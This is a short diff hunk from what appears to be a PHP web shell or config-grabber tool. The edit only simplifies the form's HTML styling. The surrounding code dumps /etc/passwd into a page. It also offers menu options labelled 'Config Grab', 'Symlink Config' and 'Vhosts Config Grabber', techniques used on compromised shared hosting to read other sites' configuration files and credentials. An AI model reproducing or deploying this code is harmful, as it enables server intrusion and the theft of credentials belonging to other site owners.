@@ -113,19 +113,19 @@ IndexIgnore *";
 <br><br><a href="symvhost/" target="_blank">Configurations</a></center>';
     	}
     } else {
-       echo '<form method="post" action=""><textarea name="passwd" class="form-control" rows="15" readonly>
+       echo '<form method="post" action=""><textarea name="passwd" rows="20" cols="20" readonly>
 ';
 if(is_readable('/etc/passwd')) {
   readfile("/etc/passwd") or include ("/etc/passwd") or die("Unable to open file!");
 } else {
   echo ("Unable to open file!");
 }
-    echo '</textarea></br><div class="input-group">
-        <select class="form-control btn-sm" name="config">
+    echo '</textarea></br>
+        <select name="config">
 		<option value="404">Config 404</option>
         <option value="grab">Config Grab</option>
         <option value="symlink">Symlink Config</option>
-		<option value="symvhosts">Vhosts Config Grabber</option></select><input class="btn btn-outline-light text-purple" type="submit" value="Submit!!"></div> </form></center>
+		<option value="symvhosts">Vhosts Config Grabber</option></select><input type="submit" value="Submit!!"> </form></center>
 ';
     }
 ?>
